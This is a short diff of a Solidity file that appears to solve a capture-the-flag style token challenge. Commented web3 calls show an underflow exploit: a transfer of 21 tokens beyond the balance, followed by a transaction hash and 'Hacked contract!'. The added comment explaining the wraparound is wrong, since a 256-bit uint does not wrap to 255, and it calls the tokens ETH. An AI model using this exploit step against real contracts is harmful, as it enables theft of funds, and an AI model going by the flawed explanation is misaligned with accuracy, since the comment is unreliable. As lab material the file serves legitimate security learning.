@@ -27,6 +27,7 @@ contract Token {
 // await web3.eth.getBalance("0x5d697d0ff3788fa4ed70BfD9bD87Adc2B03da36b") => "0"
 
 // Use underflow/overflow of the unsigned integer =D
+// Sending 21 ETH will leave us with 255 ETH, as a uint will loop around to the next value.
 // await contract.transfer("0x70a09399794331A64772E15C170b591BB6b9cf16", toWei("21")) => tx:0x25c71cae798476bbeb8449585513c2a84ce9b58b6a4a360096b3e9512db01095
 
 // Hacked contract!
